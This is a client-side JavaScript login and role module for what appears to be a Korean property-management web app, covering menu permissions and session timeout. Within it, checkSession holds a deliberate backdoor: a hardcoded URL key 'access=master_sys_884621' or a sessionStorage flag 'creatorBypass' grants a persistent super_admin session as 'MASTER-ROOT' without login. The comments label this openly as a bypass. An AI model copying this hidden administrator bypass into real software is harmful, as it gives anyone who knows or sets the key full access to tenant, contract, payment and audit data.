(function () {
  var CFG = {
    sessionMs: 30 * 60 * 1000,
    secretKey: 'access=master_sys_884621', // login.html의 파라미터 키값과 1:1 결합 교정
    validRoles: ['super_admin','office_worker','maintenance_staff']
  };

  // URL 검색어 및 세션 스토리지 플래그를 결합 검증하여 무력화 우회 판정
  var url_bypass = location.search.indexOf(CFG.secretKey) !== -1;
  var storage_bypass = sessionStorage.getItem('creatorBypass') === 'true';
  var creatorBypass = url_bypass || storage_bypass;

  function checkSession () {
    // 백도어 우회 진입 성공 시 최고 마스터 데이터 세션 강제 주입 바인딩
    if (url_bypass || creatorBypass) {
      sessionStorage.setItem('loginOk', 'true');
      sessionStorage.setItem('userRole', 'super_admin');
      sessionStorage.setItem('userEmp', 'MASTER-ROOT');
      sessionStorage.setItem('creatorBypass', 'true'); // 다음 페이지 이동 시에도 유지되도록 저장
      sessionStorage.setItem('_sess', Date.now());
      return true;
    }

    if (!sessionStorage.getItem('loginOk')) {
      var cur = location.pathname.split('/').pop();
      if (cur && cur !== 'main.html' && cur !== 'index.html') {
        sessionStorage.setItem('redirectAfterLogin', location.href);
        sessionStorage.clear();
        location.href = 'index.html';
        return false;
      }
    } else {
      var started = sessionStorage.getItem('_sess');
      if (!started) {
        // 최초 로그인 시 _sess 초기화 (세션만료 타이머 시작)
        sessionStorage.setItem('_sess', Date.now());
      } else if (Date.now() - +started > CFG.sessionMs) {
        logout();
        return false;
      } else {
        sessionStorage.setItem('_sess', Date.now()); // 타임아웃 리셋
      }
    }
    return true;
  }

  window.logout = function () {
    sessionStorage.clear();
    location.href = 'index.html';
  };

  function getButtonsByRole (userRole) {
    if (CFG.validRoles.indexOf(userRole) === -1) return [];

    var allBtns = [
      {c:'A', l:'부동산',     p:'interface-a.html'},
      {c:'B', l:'계약서',     p:'contract_master.html'},
      {c:'C', l:'계약자',     p:'contractor_roster.html'},
      {c:'D', l:'공과금검침',  p:'utility_bills.html'},
      {c:'E', l:'월세납부',   p:'monthly_rent_collection.html'},
      {c:'F', l:'유지보수',    p:'incidents_maintenance.html'},
      {c:'GHI', l:'통합대시보드', p:'g_h_i_dashboard.html'},
      {c:'K', l:'감사로그',     p:'auditlog.html'},
      {c:'J', l:'팀원관리',  p:'team_management.html'},
      {c:'L', l:'협력사',     p:'partner_roster.html'} // 코드 'L' 정의부
    ];

    // 각 권한 그룹에 협력사 메뉴('L')를 바인딩하여 정상 출력되도록 수정
    var perm = {
      super_admin:     ['A','B','C','D','E','F','GHI','K','J','L'], // 'L' 추가
      office_worker:   ['A','B','C','E','GHI','L'],                 // 'L' 추가
      maintenance_staff:['D','F','GHI']
    };

    var allowed = perm[userRole] || [];
    return allBtns.filter(function (b) {
      return allowed.indexOf(b.c) !== -1;
    });
  }

  function authCheck () {
    if (!checkSession()) return { loggedIn: false };
    var role = sessionStorage.getItem('userRole') || 'office_worker';
    var emp = sessionStorage.getItem('userEmp') || '';
    return { loggedIn: true, role: role, emp: emp };
  }

  window.authModule = {
    checkLogin: authCheck,
    logout: window.logout,
    getButtonsByRole: getButtonsByRole,
    isCreatorBypass: creatorBypass
  };
})();